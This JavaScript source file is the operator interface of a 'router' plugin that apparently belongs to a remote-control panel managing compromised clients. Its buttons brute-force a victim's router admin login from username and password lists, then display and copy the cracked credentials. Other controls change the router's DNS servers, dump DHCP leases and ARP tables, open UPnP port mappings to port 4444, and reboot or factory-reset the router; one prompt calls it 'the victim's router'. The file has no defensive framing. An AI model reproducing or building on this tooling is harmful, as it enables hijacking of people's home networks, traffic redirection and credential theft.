const PLUGIN_ID = "router";

let currentClientId = "";

const $ = (id) => document.getElementById(id);

async function rpc(method, params = {}) {
  const res = await fetch(`/api/plugins/${PLUGIN_ID}/rpc`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ method, params }),
  });
  const body = await res.json().catch(() => ({}));
  if (!body.ok) throw new Error(body.error || `rpc ${method} failed: ${res.status}`);
  return body.result;
}

async function sendEvent(event, payload = {}) {
  if (!currentClientId) {
    log("no client id set", "err");
    return;
  }
  await fetch(`/api/clients/${currentClientId}/plugins/${PLUGIN_ID}/event`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ event, payload }),
  });
}

function setBadge(state) {
  const b = $("statusBadge");
  b.className = "badge " + (state || "idle");
  b.textContent = state || "idle";
}

function log(text, kind = "") {
  const el = $("log");
  const line = document.createElement("div");
  line.className = "line" + (kind ? " " + kind : "");
  const ts = document.createElement("span");
  ts.className = "ts";
  ts.textContent = new Date().toLocaleTimeString();
  line.appendChild(ts);
  line.appendChild(document.createTextNode(text));
  el.appendChild(line);
  while (el.children.length > 200) el.removeChild(el.firstChild);
  el.scrollTop = el.scrollHeight;
}

function collectSettings() {
  return {
    gateway: $("gateway").value.trim(),
    users: $("users").value.split("\n").map((s) => s.trim()).filter(Boolean),
    passwords: $("passwords").value.split("\n").map((s) => s.trim()).filter(Boolean),
    dns1: $("dns1").value.trim(),
    dns2: $("dns2").value.trim(),
    upnpInternalIp: $("upnpInternalIp").value.trim(),
    upnpInternalPort: parseInt($("upnpInternalPort").value, 10) || 4444,
    upnpExternalPort: parseInt($("upnpExternalPort").value, 10) || 4444,
  };
}

function renderRouter(info) {
  const el = $("routerInfo");
  if (!info) {
    el.className = "info empty";
    el.textContent = "not detected yet";
    return;
  }
  el.className = "info";
  el.innerHTML = "";
  const rows = [
    ["gateway", info.gateway],
    ["brand", info.brandName || info.brand],
    ["ports", (info.ports || []).join(", ")],
    ["title", info.title],
    ["server", info.server],
    ["realm", info.realm],
  ];
  rows.forEach(([k, v]) => {
    if (!v) return;
    const d = document.createElement("div");
    d.innerHTML = `<span class="k">${k}:</span> <span class="v"></span>`;
    d.querySelector(".v").textContent = v;
    el.appendChild(d);
  });
  if (info.gateway && !$("gateway").value) $("gateway").value = info.gateway;
}

function renderCreds(list) {
  $("credCount").textContent = list.length;
  const body = $("credBody");
  body.innerHTML = "";
  if (!list.length) {
    $("credEmpty").style.display = "block";
    return;
  }
  $("credEmpty").style.display = "none";
  list.forEach((c) => {
    const tr = document.createElement("tr");
    for (const v of [c.gateway, c.brand, c.user]) {
      const td = document.createElement("td");
      td.textContent = v || "-";
      tr.appendChild(td);
    }
    const td = document.createElement("td");
    td.className = "pw";
    td.textContent = c.password === "" ? "(blank)" : (c.password || "-");
    td.title = "click to copy";
    td.onclick = () => navigator.clipboard.writeText(c.password || "").then(() => log("password copied", "ok"));
    tr.appendChild(td);
    body.appendChild(tr);
  });
}

function renderLeases(list) {
  $("leaseCount").textContent = list.length;
  const body = $("leaseBody");
  body.innerHTML = "";
  if (!list.length) {
    $("leaseEmpty").style.display = "block";
    return;
  }
  $("leaseEmpty").style.display = "none";
  list.forEach((l) => {
    const tr = document.createElement("tr");
    for (const v of [l.host, l.ip, l.mac]) {
      const td = document.createElement("td");
      td.textContent = v || "-";
      tr.appendChild(td);
    }
    body.appendChild(tr);
  });
}

function handleStream(data) {
  if (!data) return;
  const evt = data.event;
  const p = data.payload ?? data;
  if (p && p.clientId && p.clientId !== currentClientId) return;

  switch (evt) {
    case "status":
      setBadge(p.state);
      if (p.detail) log(p.detail, p.state === "warning" ? "err" : "");
      break;
    case "router":
      renderRouter(p);
      log(`detected ${p.brandName || p.brand} at ${p.gateway}`, "ok");
      break;
    case "cred":
      loadCreds();
      log(`ADMIN ACCESS: ${p.user} / ${p.password === "" ? "(blank)" : p.password}`, "ok");
      break;
    case "leases":
      renderLeases(p.leases || []);
      log(`${(p.leases || []).length} lease(s) pulled`, "ok");
      break;
    case "error":
      log(p.message || "error", "err");
      break;
    default:
      break;
  }
}

function connectStream() {
  const es = new EventSource(`/api/plugins/${PLUGIN_ID}/stream`);
  ["status", "router", "cred", "leases", "error", "pong"].forEach((ch) => {
    es.addEventListener(ch, (ev) => {
      let data;
      try { data = JSON.parse(ev.data); } catch { data = null; }
      if (data != null) handleStream({ event: ch, payload: data });
    });
  });
  es.onerror = () => {
    es.close();
    setTimeout(connectStream, 3000);
  };
}

async function loadCreds() {
  if (!currentClientId) return;
  try { renderCreds(await rpc("list_creds", { clientId: currentClientId })); } catch (e) {}
}

async function loadLeases() {
  if (!currentClientId) return;
  try { renderLeases(await rpc("list_leases", { clientId: currentClientId })); } catch (e) {}
}

async function loadRouter() {
  if (!currentClientId) return;
  try { renderRouter(await rpc("get_router", { clientId: currentClientId })); } catch (e) {}
}

async function loadConfig() {
  if (!currentClientId) return;
  try {
    const cfg = await rpc("get_config", { clientId: currentClientId });
    if (cfg.gateway) $("gateway").value = cfg.gateway;
    if (cfg.users) $("users").value = (cfg.users || []).join("\n");
    if (cfg.passwords) $("passwords").value = (cfg.passwords || []).join("\n");
    if (cfg.dns1) $("dns1").value = cfg.dns1;
    if (cfg.dns2) $("dns2").value = cfg.dns2;
  } catch (e) {}
}

async function refreshClients() {
  try {
    const clients = await rpc("list_clients");
    const dl = $("clientsList");
    dl.innerHTML = "";
    clients.forEach((c) => {
      const o = document.createElement("option");
      o.value = c.clientId;
      dl.appendChild(o);
    });
    $("clientCount").textContent =
      clients.length ? `${clients.length} client(s) seen` : "no clients seen yet";
    if (clients.length && !currentClientId) {
      currentClientId = clients[0].clientId;
      $("clientId").value = currentClientId;
      loadConfig(); loadRouter(); loadCreds(); loadLeases();
    }
  } catch (e) {}
}

async function save() {
  try { await rpc("save_config", { clientId: currentClientId, config: collectSettings() }); } catch (e) {}
}

function bind() {
  $("clientId").addEventListener("change", (e) => {
    currentClientId = e.target.value.trim();
    loadConfig(); loadRouter(); loadCreds(); loadLeases();
  });

  $("refreshClients").addEventListener("click", refreshClients);

  $("detect").addEventListener("click", async () => {
    await save();
    setBadge("scanning");
    sendEvent("detect", collectSettings());
  });

  $("attack").addEventListener("click", async () => {
    await save();
    setBadge("attacking");
    sendEvent("attack", collectSettings());
  });

  $("setDns").addEventListener("click", async () => {
    await save();
    sendEvent("set_dns", collectSettings());
  });

  $("dumpArp").addEventListener("click", () => sendEvent("dump_arp", collectSettings()));
  $("upnpMap").addEventListener("click", () => sendEvent("upnp_map", collectSettings()));
  $("upnpList").addEventListener("click", () => sendEvent("upnp_list", collectSettings()));
  $("reboot").addEventListener("click", () => {
    if (confirm("Reboot the victim's router? Their whole network drops for ~60s.")) {
      sendEvent("reboot", collectSettings());
    }
  });
  $("factory").addEventListener("click", () => sendEvent("factory_reset", collectSettings()));
}

bind();
connectStream();
loadConfig(); loadRouter(); loadCreds(); loadLeases();
refreshClients();
